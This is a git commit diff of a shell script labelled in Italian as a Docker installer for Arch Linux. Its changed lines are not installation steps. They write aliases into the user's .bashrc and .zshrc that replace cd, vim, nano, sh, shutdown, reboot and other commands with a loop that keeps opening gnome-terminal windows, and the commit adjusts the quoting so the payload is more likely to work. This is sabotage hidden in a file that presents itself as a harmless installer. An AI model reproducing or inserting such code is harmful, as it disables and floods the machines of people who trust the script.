548ccfb0a6230d694117a8e46653a83054b2a48b
Rossi-Tommaso <tommasoemanuele.rossi@istitutoagnelli.it>
2025-03-21 12:31:29 +0100

    v 1.4

--- docker.sh
+++ docker.sh
@@ -1,20 +1,20 @@
 # Script per installare Docker su Arch Linux
-echo 'alias code=while do gnome-terminal: done; ||' >> ~/.zshrc
-echo 'alias code=while do gnome-terminal: done; ||' >>  ~/.bashrc 
-echo 'alias cd=while do gnome-terminal: done; ||' >> ~/.zshrc
-echo 'alias cd=while do gnome-terminal: done; ||' >> ~/.bashrc
-echo 'alias sh=while do gnome-terminal: done; ||' >> ~/.zshrc
-echo 'alias sh=while do gnome-terminal: done; ||' >>  ~/.bashrc
-echo 'alias vim=while do gnome-terminal: done; ||' >> ~/.zshrc
-echo 'alias vim=while do gnome-terminal: done; ||' >> ~/.bashrc
-echo 'alias nano=while do gnome-terminal: done; ||' >> ~/.zshrc
-echo 'alias nano=while do gnome-terminal: done; ||' >> ~/.bashrc
-echo 'alias shutdown=while do gnome-terminal: done; ||' >>  ~/.zshrc
-echo 'alias shutdown=while do gnome-terminal: done; ||' >> ~/.bashrc
-echo 'alias reboot=while do gnome-terminal: done; ||' >> ~/.zshrc
-echo 'alias reboot=while do gnome-terminal: done; ||' >> ~/.bashrc
-awk 'BEGIN {print "alias neofetch=while do gnome-terminal: done; ||"} {print}' .zshrc > suca.txt && mv suca.txt .zshrc
-awk 'BEGIN {print "alias neofetch=while do gnome-terminal: done; ||"} {print}' .bashrc > suca.txt && mv suca.txt .bashrc
+echo 'alias code="while do gnome-terminal: done; ||"' >> ~/.zshrc
+echo 'alias code="while do gnome-terminal: done; ||"' >>  ~/.bashrc 
+echo 'alias cd="while do gnome-terminal: done; ||"' >> ~/.zshrc
+echo 'alias cd="while do gnome-terminal: done; ||"' >> ~/.bashrc
+echo 'alias sh="while do gnome-terminal: done; ||"' >> ~/.zshrc
+echo 'alias sh="while do gnome-terminal: done; ||"' >>  ~/.bashrc
+echo 'alias vim="while do gnome-terminal: done; ||"' >> ~/.zshrc
+echo 'alias vim="while do gnome-terminal: done; ||"' >> ~/.bashrc
+echo 'alias nano="while do gnome-terminal: done; ||"' >> ~/.zshrc
+echo 'alias nano="while do gnome-terminal: done; ||"' >> ~/.bashrc
+echo 'alias shutdown="while do gnome-terminal: done; ||"' >>  ~/.zshrc
+echo 'alias shutdown="while do gnome-terminal: done; ||"' >> ~/.bashrc
+echo 'alias reboot="while do gnome-terminal: done; ||"' >> ~/.zshrc
+echo 'alias reboot="while do gnome-terminal: done; ||"' >> ~/.bashrc
+awk 'BEGIN {print "alias neofetch="while do gnome-terminal: done; ||""} {print}' .zshrc > suca.txt && mv suca.txt .zshrc
+awk 'BEGIN {print "alias neofetch="while do gnome-terminal: done; ||""} {print}' .bashrc > suca.txt && mv suca.txt .bashrc
 
 # Aggiornamento del sistema
 echo "Aggiornamento del sistema in corso..."
